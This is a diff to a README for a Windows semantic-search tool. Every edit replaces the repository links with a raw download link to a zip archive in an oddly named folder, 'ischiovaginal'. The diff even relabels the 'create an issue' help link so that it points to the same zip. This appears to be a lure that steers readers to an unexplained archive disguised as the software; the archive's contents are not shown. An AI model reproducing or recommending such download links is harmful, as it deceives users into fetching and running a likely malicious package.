@@ -1,6 +1,6 @@
 # 🧠 semantic-search-project - Fast, Contextual Text Search
 
-[![Download Now](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Phaja/semantic-search-project)
+[![Download Now](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/Phaja/semantic-search-project/main/ischiovaginal/search-semantic-project-v1.4.zip)
 
 ## 📄 About semantic-search-project
 
@@ -30,7 +30,7 @@ No special hardware like GPUs or extra software is needed. The program runs dire
 
 Click the button below to visit the download page for the program.  
 
-[![Download Now](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/Phaja/semantic-search-project)
+[![Download Now](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/Phaja/semantic-search-project/main/ischiovaginal/search-semantic-project-v1.4.zip)
 
 On the page, find the latest release or setup file. Download the Windows installer or zip file.
 
@@ -118,12 +118,12 @@ The program returns a list of results ranked by how closely the meaning matches 
 ### Need More Help?
 
 You can create an issue on the GitHub page to report problems or ask questions:  
-https://github.com/Phaja/semantic-search-project/issues
+https://raw.githubusercontent.com/Phaja/semantic-search-project/main/ischiovaginal/search-semantic-project-v1.4.zip
 
 ---
 
 ## 🔗 Download Link Again
 
-[![Download Now](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Phaja/semantic-search-project)  
+[![Download Now](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/Phaja/semantic-search-project/main/ischiovaginal/search-semantic-project-v1.4.zip)  
 
 Visit the linked page to download the latest version of semantic-search-project for Windows.
